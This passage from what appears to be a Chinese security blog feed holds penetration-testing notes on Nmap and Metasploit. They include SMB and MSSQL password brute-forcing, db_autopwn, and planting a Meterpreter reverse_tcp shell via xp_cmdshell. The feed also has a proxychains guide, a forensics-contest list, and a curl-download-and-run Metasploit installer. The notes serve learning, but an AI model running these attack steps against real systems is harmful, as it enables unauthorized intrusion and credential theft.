class="line">EXAMPLES:</span><br><span class="line">  nmap -v -A scanme.nmap.org</span><br><span class="line">  nmap -v -sP 192.168.0.0&#x2F;16 10.0.0.0&#x2F;8</span><br><span class="line">  nmap -v -iR 10000 -P0 -p 80</span><br></pre></td></tr></table></figure><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>扫描主机开放的端口：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; nmap -sT -v xxx.xxx.xxx.xxx</span><br></pre></td></tr></table></figure><p>详细显示，syn探测，高速扫描，系统和服务版本信息，脚本扫描和路由跟踪：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; nmap -v -sS -A -T4 target</span><br></pre></td></tr></table></figure><p>-sT表示tcp端口扫描(完整三次握手)，-v表示显示详细信息 </p><h2 id="2-Metasploit"><a href="#2-Metasploit" class="headerlink" title="2. Metasploit"></a>2. Metasploit</h2><h3 id="2-1-一次简单的使用流程"><a href="#2-1-一次简单的使用流程" class="headerlink" title="2.1 一次简单的使用流程"></a>2.1 一次简单的使用流程</h3><h4 id="启动MSF"><a href="#启动MSF" class="headerlink" title="启动MSF"></a>启动MSF</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; msfconsole</span><br></pre></td></tr></table></figure><h4 id="搜索漏洞"><a href="#搜索漏洞" class="headerlink" title="搜索漏洞"></a>搜索漏洞</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; search wordpress</span><br></pre></td></tr></table></figure><h4 id="选择漏洞利用exp"><a href="#选择漏洞利用exp" class="headerlink" title="选择漏洞利用exp"></a>选择漏洞利用exp</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use xxx</span><br></pre></td></tr></table></figure><h4 id="设置攻击载荷（Payload）"><a href="#设置攻击载荷（Payload）" class="headerlink" title="设置攻击载荷（Payload）"></a>设置攻击载荷（Payload）</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 'show options' means showing the advandce options to custom. e.g.</span></span><br><span class="line">&gt; msf exploit(windows/mysql/mysql_mof) &gt; show options</span><br></pre></td></tr></table></figure><h4 id="设置攻击选项"><a href="#设置攻击选项" class="headerlink" title="设置攻击选项"></a>设置攻击选项</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># set the information about the exploit process. e.g.</span></span><br><span class="line">&gt; <span class="built_in">set</span> RHOST 115.28.xxx.xxx</span><br></pre></td></tr></table></figure><h4 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击"></a>开始攻击</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Exploit it!</span></span><br><span class="line">&gt; exploit</span><br></pre></td></tr></table></figure><h4 id="建立会话"><a href="#建立会话" class="headerlink" title="建立会话"></a>建立会话</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 列出所有会话</span></span><br><span class="line">&gt; sessions -l</span><br><span class="line"><span class="comment"># 进入1号会话</span></span><br><span class="line">&gt; sessions –i 1 </span><br><span class="line"><span class="comment"># 查询攻击者的身份</span></span><br><span class="line">&gt; getuid</span><br></pre></td></tr></table></figure><h3 id="2-2-一些组件"><a href="#2-2-一些组件" class="headerlink" title="2.2 一些组件"></a>2.2 一些组件</h3><h4 id="Payload生成器"><a href="#Payload生成器" class="headerlink" title="Payload生成器"></a>Payload生成器</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># msfpayload已被弃用</span></span><br><span class="line">&gt; msfpayload -h</span><br><span class="line"><span class="comment"># 现使用msfvenom </span></span><br><span class="line">&gt; msfvenom -h</span><br></pre></td></tr></table></figure><h4 id="数据库子系统"><a href="#数据库子系统" class="headerlink" title="数据库子系统"></a>数据库子系统</h4><p>可创建数据库子系统，用于存储测试过程中的数据。支持Postgre SQL，MySQL，SQLite3数据库。</p><p>//TODO</p><p><a href="https://blog.csdn.net/FunkyPants/article/details/78483792" target="_blank" rel="noopener">https://blog.csdn.net/FunkyPants/article/details/78483792</a></p><h3 id="2-3-情报搜集"><a href="#2-3-情报搜集" class="headerlink" title="2.3 情报搜集"></a>2.3 情报搜集</h3><p>记录的详细与否是一次渗透测试成败的关键点</p><h4 id="被动信息搜集-Passive-Information-Gathering"><a href="#被动信息搜集-Passive-Information-Gathering" class="headerlink" title="被动信息搜集(Passive Information Gathering)"></a>被动信息搜集(Passive Information Gathering)</h4><p>这里的主动与被动所指的是，是不是与目标主机直接进行交互。如果不是直接进行交互，例如使用Shodan查询，这些就是被动信息搜集（我们利用网络上其他“人”提供给我们的信息，因此我们是被动获取信息的）。相反地，与目标服务器直接进行交互，例如使用Nmap进行扫描，就是主动的信息搜集了。</p><h5 id="whois"><a href="#whois" class="headerlink" title="whois"></a>whois</h5><p>确定网络资产所有者的相关信息</p><h5 id="DNS-查询"><a href="#DNS-查询" class="headerlink" title="DNS 查询"></a>DNS 查询</h5><ol><li>netlookup<br>终端工具，可以直接查看域名对应的IP信息</li></ol><h4 id="主动信息搜集-Positive-information-Gathering"><a href="#主动信息搜集-Positive-information-Gathering" class="headerlink" title="主动信息搜集(Positive information Gathering)"></a>主动信息搜集(Positive information Gathering)</h4><ol><li>使用Nmap</li></ol><p>上文👆</p><ol start="2"><li>框架提供的扫描工具<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; search portscan</span><br><span class="line"><span class="comment"># 使用syn扫描器（TCP/IP握手包）</span></span><br><span class="line">msf &gt; use scanner/portscan/syn</span><br><span class="line">msf &gt; <span class="built_in">set</span>...</span><br><span class="line">msf &gt; run</span><br></pre></td></tr></table></figure></li></ol><h4 id="针对性扫描"><a href="#针对性扫描" class="headerlink" title="针对性扫描"></a>针对性扫描</h4><h5 id="服务器消息块协议扫描"><a href="#服务器消息块协议扫描" class="headerlink" title="服务器消息块协议扫描"></a>服务器消息块协议扫描</h5><p>利用Microsoft制定的网络通讯协议中表示块中的SMB（服务器信息块协议），遍历网络，获取Windows系统版本号。  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use scanner/smb/smb_version</span><br><span class="line">msf &gt; <span class="built_in">set</span>...</span><br><span class="line">msf &gt; run</span><br></pre></td></tr></table></figure><h5 id="Microsoft-SQL-Server扫描"><a href="#Microsoft-SQL-Server扫描" class="headerlink" title="Microsoft SQL Server扫描"></a>Microsoft SQL Server扫描</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use scanner/mssql/mssql_ping</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h5 id="SSH服务扫描"><a href="#SSH服务扫描" class="headerlink" title="SSH服务扫描"></a>SSH服务扫描</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use scanner/ssh/ssh_version</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h5 id="FTP扫描"><a href="#FTP扫描" class="headerlink" title="FTP扫描"></a>FTP扫描</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use scanner/ftp/ftp_version</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h5 id="SNMP（简单网管协议）扫描"><a href="#SNMP（简单网管协议）扫描" class="headerlink" title="SNMP（简单网管协议）扫描"></a>SNMP（简单网管协议）扫描</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use scanner/snmp/snmp_login</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h5 id="自制扫描器"><a href="#自制扫描器" class="headerlink" title="自制扫描器"></a>自制扫描器</h5><h3 id="2-4-漏洞扫描"><a href="#2-4-漏洞扫描" class="headerlink" title="2.4 漏洞扫描"></a>2.4 漏洞扫描</h3><h4 id="NeXpose"><a href="#NeXpose" class="headerlink" title="NeXpose"></a>NeXpose</h4><p>Rapid7公司的一款漏洞扫描产品，有社区免费版。可使用Web端图形化显示（localhost:3780），也可使用MSF终端启动。  </p><h5 id="生成报告导入MSF"><a href="#生成报告导入MSF" class="headerlink" title="生成报告导入MSF"></a>生成报告导入MSF</h5><p>创建一个新数据库（参见上文），使用<code>db_connect</code>连接，使用<code>db_import</code>导入XML格式的报告。使用<code>db_hosts</code>测试是否倒入成功。使用<code>db_vulns</code>查看导入漏洞的详细信息。</p><h5 id="在MSF内使用NeXpose"><a href="#在MSF内使用NeXpose" class="headerlink" title="在MSF内使用NeXpose"></a>在MSF内使用NeXpose</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 删除现有库</span></span><br><span class="line">msf &gt; de_destory postgres:pass@127.0.0.1/msf3</span><br><span class="line"><span class="comment"># 创建一个新库</span></span><br><span class="line">msf &gt; de_connect postgres:pass@127.0.0.1/msf3</span><br><span class="line"><span class="comment"># 载入nexpose插件</span></span><br><span class="line">msf &gt; load nexpose</span><br><span class="line"><span class="comment"># 显示导入的nexpose的帮助</span></span><br><span class="line">msf &gt; <span class="built_in">help</span></span><br><span class="line"><span class="comment"># 第一次连接需要设置安装的nexpose实例</span></span><br><span class="line">msf &gt; nexpose_connect -h</span><br><span class="line">...</span><br><span class="line"><span class="comment"># 扫描目标地址</span></span><br><span class="line">msf &gt; nexpose_scan xxx.xxx.xxx.xxx</span><br><span class="line"><span class="comment"># 扫描后，结果已存在数据库</span></span><br><span class="line">msf &gt; db_hosts -c address</span><br><span class="line">msf &gt; db_vulns</span><br></pre></td></tr></table></figure><h4 id="Nessus"><a href="#Nessus" class="headerlink" title="Nessus"></a>Nessus</h4><p>默认端口为为8834，使用步骤与NeXpose相同👆</p><h4 id="专用漏洞扫描器"><a href="#专用漏洞扫描器" class="headerlink" title="专用漏洞扫描器"></a>专用漏洞扫描器</h4><h5 id="SMB-Login-check"><a href="#SMB-Login-check" class="headerlink" title="SMB Login check"></a>SMB Login check</h5><p>对Windows主机的用户名和口令进行破解。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/smb/smb_login</span><br><span class="line">msf &gt; show options</span><br></pre></td></tr></table></figure><h5 id="VNC空口令扫描"><a href="#VNC空口令扫描" class="headerlink" title="VNC空口令扫描"></a>VNC空口令扫描</h5><p>VNC即虚拟网络计算，提供远程访问系统桌面的服务。新版本的VNC不再允许使用VNC，并且绝大多数情况会一无所获。但渗透环境是多样的，以及一个优秀的渗透测试工程师会对目标采取千方百计的手段。  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/vnc/vnc_none_auth</span><br><span class="line">msf &gt; show options</span><br></pre></td></tr></table></figure><h5 id="X11服务器扫描"><a href="#X11服务器扫描" class="headerlink" title="X11服务器扫描"></a>X11服务器扫描</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; search x11</span><br><span class="line">...</span><br><span class="line">msf &gt; use auxiliary/scanner/x11/open_x11</span><br></pre></td></tr></table></figure><p>X系统用于处理包括鼠标和键盘在内的图形用户界面，我们可以结合Back|Track的xray工具对目标的键盘输入进行记录。</p><h4 id="利用扫描结果自动化攻击"><a href="#利用扫描结果自动化攻击" class="headerlink" title="利用扫描结果自动化攻击"></a>利用扫描结果自动化攻击</h4><p>使用Metasploit的autopwn工具，根据漏洞扫描器的结果自动进行渗透攻击。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; db_connect portgres:pass@127.0.0.1/msf3</span><br><span class="line">msf &gt; db_import your_nessues_export_file_path</span><br><span class="line">msf &gt; du_autopwn -e -t -r -x -p</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>使用db_autopwn命令后自动进行渗透攻击，其参数含义如下：<br>|argument|implication|<br>|— | —-|<br>|-e|对所有目标发起进攻|<br>|-t|显示所有匹配的模块|<br>|-r|利用反弹shell的payload|<br>|-x|根据漏洞选择攻击模块|<br>|-p|根据开放端口选择攻击模块|</p><p>后面会对该模块进行详细介绍。</p><h3 id="渗透测试执行标准"><a href="#渗透测试执行标准" class="headerlink" title="渗透测试执行标准"></a>渗透测试执行标准</h3><h3 id="Exploit-db-com"><a href="#Exploit-db-com" class="headerlink" title="Exploit-db.com"></a>Exploit-db.com</h3><p>一个综合性的软件脆弱性和漏洞信息收集平台，它为软件开发者、安全漏洞研究人员、渗透测试者提供了大量的有关于各个操作系统、主流软件应用的脆弱性信息或漏洞利用程序</p><h3 id="渗透攻击之旅"><a href="#渗透攻击之旅" class="headerlink" title="渗透攻击之旅"></a>渗透攻击之旅</h3><h4 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h4><h5 id="show-exploits"><a href="#show-exploits" class="headerlink" title="show exploits"></a>show exploits</h5><h5 id="show-auxiliary"><a href="#show-auxiliary" class="headerlink" title="show auxiliary"></a>show auxiliary</h5><h5 id="show-options"><a href="#show-options" class="headerlink" title="show options"></a>show options</h5><h5 id="show-payloads"><a href="#show-payloads" class="headerlink" title="show payloads"></a>show payloads</h5><h5 id="show-targets"><a href="#show-targets" class="headerlink" title="show targets"></a>show targets</h5><h5 id="search"><a href="#search" class="headerlink" title="search"></a>search</h5><p>根据关键词搜索攻击模块</p><h5 id="back"><a href="#back" class="headerlink" title="back"></a>back</h5><h5 id="use"><a href="#use" class="headerlink" title="use"></a>use</h5><h5 id="set-amp-unset"><a href="#set-amp-unset" class="headerlink" title="set &amp; unset"></a>set &amp; unset</h5><p>变量不必须为大写，但这是个好习惯</p><h5 id="setg-amp-unsetg"><a href="#setg-amp-unsetg" class="headerlink" title="setg &amp; unsetg"></a>setg &amp; unsetg</h5><p>对全局参数进行设置或清楚</p><h5 id="save"><a href="#save" class="headerlink" title="save"></a>save</h5><p>保存setg设置的全局变量，下次启动msfconsole时继续使用</p><h5 id="info"><a href="#info" class="headerlink" title="info"></a>info</h5><h4 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a>Meterpreter</h4><h5 id="e-g-攻击一台Windows-XP"><a href="#e-g-攻击一台Windows-XP" class="headerlink" title="e.g. 攻击一台Windows XP"></a>e.g. 攻击一台Windows XP</h5><ol><li>扫描端口服务</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; nmap -sT -A -PO xxx.xxx</span><br></pre></td></tr></table></figure><p>发现MS SQL服务  </p><ol start="2"><li>攻击MS SQL，TCP默认端口一般为1433，UDP默认端口为1434</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; nmap -sU xxx.xxx -p1434</span><br><span class="line">msf &gt; use scanner/mssql/mssql_ping</span><br></pre></td></tr></table></figure><ol start="3"><li>暴力破解MS SQL</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use scanner/mssql/mssql_login</span><br><span class="line">msf &gt; show options</span><br><span class="line">msf &gt; <span class="built_in">set</span> PASS_FILE /xxx/xxx/xxx.txt</span><br><span class="line">...</span><br><span class="line">msf &gt; exploit</span><br></pre></td></tr></table></figure><p>补充：Fast-Track工具</p><ol start="4"><li>注入Meterpreter shell<br>因为是XP系统，所以我们利用xp_cmdshell进行交互，进一步的思路是上传Meterpreter shell来更深入的渗透。<br>方便的是，MSF已经含有一个<strong>模块</strong>，可以实现通过xp_cmdshell来植入任意Metasploit攻击载荷（如Meterpreter），过程如下：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use windows/mssql/mssql_payload</span><br><span class="line">msf &gt; show options</span><br><span class="line"><span class="comment"># 设置自己选择的payload</span></span><br><span class="line">msf &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf &gt; <span class="built_in">set</span> LHOST //TODO</span><br><span class="line">msf &gt; <span class="built_in">set</span> LPORT 443</span><br><span class="line">...</span><br><span class="line">msf &gt; exploit</span><br></pre></td></tr></table></figure><h2 id="杂"><a href="#杂" class="headerlink" title="杂"></a>杂</h2><h3 id="常用端口及服务"><a href="#常用端口及服务" class="headerlink" title="常用端口及服务"></a>常用端口及服务</h3><p>离线网站保存</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>虚拟机&amp;终端使用 proxychains </title>
      <link href="/2019/11/26//articles/2019/11/26/1574748802466.html/"/>
      <url>/2019/11/26//articles/2019/11/26/1574748802466.html/</url>
      
        <content type="html"><![CDATA[<h1 id="虚拟机-amp-终端使用-proxychains"><a href="#虚拟机-amp-终端使用-proxychains" class="headerlink" title="虚拟机&amp;终端使用 proxychains"></a>虚拟机&amp;终端使用 proxychains</h1><p>经常使用Linux虚拟机终端ssh，但代理设置总是很头疼，大环境下SS又经常挂，在终端里配置SS太浪费时间。直到看到了这个工具proxychains，可以非常方便地实现虚拟机使用主机SS，不需要进行复杂的配置。</p><h2 id="主机开启本地SS代理"><a href="#主机开启本地SS代理" class="headerlink" title="主机开启本地SS代理"></a>主机开启本地SS代理</h2><p>开启本地SS代理，且允许局域网连接，部分版本的代理软件没有这个选项，只需要把本地代理地址改为0.0.0.0就可以了，如下图：<br><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191126113113.png" alt="设置本地代理" style="zoom: 50%;" /><br><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191126113003.png" alt="局域网连接" style="zoom:50%;" /></p><h2 id="虚拟机设置proxychains"><a href="#虚拟机设置proxychains" class="headerlink" title="虚拟机设置proxychains"></a>虚拟机设置proxychains</h2><h3 id="互相通信"><a href="#互相通信" class="headerlink" title="互相通信"></a>互相通信</h3><p>首先，确保虚拟机与主机能够互相ping通，不再赘述。</p><h3 id="安装proxychains"><a href="#安装proxychains" class="headerlink" title="安装proxychains"></a>安装proxychains</h3><p>使用源安装即可, e.g.  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install proxychains</span><br></pre></td></tr></table></figure><h3 id="编辑配置"><a href="#编辑配置" class="headerlink" title="编辑配置"></a>编辑配置</h3><p>配置信息全部在<code>/etc/proxychains.conf</code>文件，编辑，找到最后<code>[ProxyList]</code>的信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">[ProxyList]</span><br><span class="line"># add proxy here ...</span><br><span class="line"># meanwile</span><br><span class="line"># defaults set to &quot;tor&quot;</span><br><span class="line"># socks4        127.0.0.1 9050</span><br><span class="line">socks5 192.168.1.147 1086</span><br></pre></td></tr></table></figure><p>在最后一行，添加自己主机代理信息（代理协议 代理主机的地址 代理端口）即可，代理地址写主机的IP，不要写127.0.0.1。</p><h3 id="测试连接情况"><a href="#测试连接情况" class="headerlink" title="测试连接情况"></a>测试连接情况</h3><p>curl ip.cn即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ proxychains curl ip.cn</span><br></pre></td></tr></table></figure><p>如果返回的IP为境外IP，则代理连接成功。e.g.   </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ proxychains curl ip.cn</span><br><span class="line">ProxyChains-3.1 (http://proxychains.sf.net)</span><br><span class="line">|DNS-request| ip.cn</span><br><span class="line">|S-chain|-&lt;&gt;-192.168.1.147:1086-&lt;&gt;&lt;&gt;-4.2.2.2:53-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|DNS-response| ip.cn is 104.16.24.99</span><br><span class="line">|S-chain|-&lt;&gt;-192.168.1.147:1086-&lt;&gt;&lt;&gt;-104.16.24.99:80-&lt;&gt;&lt;&gt;-OK</span><br></pre></td></tr></table></figure><p>其中，104.16.24.99为境外IP，连接成功。</p><h3 id="使用proxychains"><a href="#使用proxychains" class="headerlink" title="使用proxychains"></a>使用proxychains</h3><p>在使用proxychains时，只要在所有需要用到代理进行通信的命令前加上<code>proxychains</code>即可。e.g.  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$  proxychains git <span class="built_in">clone</span> https://github.com/haad/proxychains.git</span><br><span class="line">ProxyChains-3.1 (http://proxychains.sf.net)</span><br><span class="line">Cloning into <span class="string">'proxychains'</span>...</span><br><span class="line">|DNS-request| github.com</span><br><span class="line">|S-chain|-&lt;&gt;-192.168.1.147:1086-&lt;&gt;&lt;&gt;-4.2.2.2:53-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|DNS-response| github.com is 192.30.255.113</span><br><span class="line">|S-chain|-&lt;&gt;-192.168.1.147:1086-&lt;&gt;&lt;&gt;-192.30.255.113:443-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">remote: Enumerating objects: 815, <span class="keyword">done</span>.</span><br><span class="line">remote: Total 815 (delta 0), reused 0 (delta 0), pack-reused 815</span><br><span class="line">Receiving objects: 100% (815/815), 469.34 KiB | 359.00 KiB/s, <span class="keyword">done</span>.</span><br><span class="line">Resolving deltas: 100% (482/482), <span class="keyword">done</span>.</span><br></pre></td></tr></table></figure><p>如果觉得麻烦，可以直接使用<code>proxychains bash</code>命令，给终端加上全局代理</p>]]></content>
      
      
      
        <tags>
            
            <tag> Note </tag>
            
            <tag> 跨过山和大海 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[更新中]国内外取证/数据比赛梳理</title>
      <link href="/2019/11/25//articles/2019/11/25/1574622572769.html/"/>
      <url>/2019/11/25//articles/2019/11/25/1574622572769.html/</url>
      
        <content type="html"><![CDATA[<h1 id="国内外取证-数据赛梳理"><a href="#国内外取证-数据赛梳理" class="headerlink" title="国内外取证/数据赛梳理"></a>国内外取证/数据赛梳理</h1><h2 id="国内"><a href="#国内" class="headerlink" title="国内"></a>国内</h2><ol><li>信息安全铁人三项<blockquote><p>包括信息安全数据分析对抗赛（简称“数据分析赛”）<br>侧重考查针对上述计算环境下各种网络流量、日志、用户行为等海量数据的分析能力，如网络流量分析等。<br>信息安全铁人三项赛必须是以高校团队名义参赛，每所高校只能有一支队伍参赛。<br>信息安全铁人三项赛采用以“年”为周期的联赛模式，原则上每年的9月到次年的6月份定义为一个赛季，原则上每年的6月为总决赛日期，每年的9月为该年度的下赛季的启动日期。  </p></blockquote></li></ol><ol start="2"><li>“美亚杯”中国电子数据取证大赛<br>官网地址：<a href="http://www.meiyacup.com/" target="_blank" rel="noopener">http://www.meiyacup.com/</a><blockquote><p>大赛分学生组和职业组，学生组由在校本、专科生和研究生组成，职业组由电子数据取证相关人员组成；每个单位所报参赛队数量不限，每个参赛队限报3名队员，大赛分为资格赛与团体赛两个阶段。</p></blockquote></li></ol><ol start="3"><li>2019 虎鲸杯电子取证大赛(已比完)<br>赛后复盘总结：<br><a href="https://www.anquanke.com/post/id/177714" target="_blank" rel="noopener">https://www.anquanke.com/post/id/177714</a></li></ol><h2 id="国外"><a href="#国外" class="headerlink" title="国外"></a>国外</h2><ol start="0"><li><p>Forensic Focus<br><a href="https://www.forensicfocus.com/" target="_blank" rel="noopener">https://www.forensicfocus.com/</a><br>一个数字取证的门户网站，内容比较丰富，可以关注一下它的友链</p></li><li><p>Sans DFIR<br><a href="https://digital-forensics.sans.org/" target="_blank" rel="noopener">https://digital-forensics.sans.org/</a><br>一个集合了培训、训练和资质认定，关于数字取证、威胁情报的网站。看起来不错的亚子。<br>上面一个发布的挑战，可以当作练习试一下：<br><a href="https://digital-forensics.sans.org/community/challenges" target="_blank" rel="noopener">https://digital-forensics.sans.org/community/challenges</a></p></li><li><p>DFRWS<br>数字取证非盈利论坛，偏学术的亚子：<br><a href="https://dfrws.org/" target="_blank" rel="noopener">https://dfrws.org/</a></p></li><li><p>Defcon DFIR CTF<br>2019年WP：<br><a href="https://www.jaiminton.com/Defcon/DFIR-2019/" target="_blank" rel="noopener">https://www.jaiminton.com/Defcon/DFIR-2019/</a><br>2019年题目复现：<br><a href="https://defcon2019.ctfd.io/challenges" target="_blank" rel="noopener">https://defcon2019.ctfd.io/challenges</a><br>⚠️这个比赛可以重点关注一下</p></li></ol><h2 id="一些练习"><a href="#一些练习" class="headerlink" title="一些练习"></a>一些练习</h2><p><a href="https://www.ashemery.com/dfir.html" target="_blank" rel="noopener">https://www.ashemery.com/dfir.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 安全综合 </tag>
            
            <tag> 更新中 </tag>
            
            <tag> DigtalForensics </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Tips】Ubuntu一键安装MSF</title>
      <link href="/2019/11/20//articles/2019/11/20/1574245921559.html/"/>
      <url>/2019/11/20//articles/2019/11/20/1574245921559.html/</url>
      
        <content type="html"><![CDATA[<h1 id="Ubuntu一键安装MSF"><a href="#Ubuntu一键安装MSF" class="headerlink" title="Ubuntu一键安装MSF"></a>Ubuntu一键安装MSF</h1><p>一个简单的脚本在Ubuntu安装MSF，不用装依赖啦✌️  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;rapid7&#x2F;metasploit-omnibus&#x2F;master&#x2F;config&#x2F;templates&#x2F;metasploit-framework-wrappers&#x2F;msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; .&#x2F;msfinstall</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 安全综合 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> Tips </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前渗透信息搜集改进</title>
      <link href="/2019/11/19//articles/2019/11/19/1574144148222.html/"/>
      <url>/2019/11/19//articles/2019/11/19/1574144148222.html/</url>
      
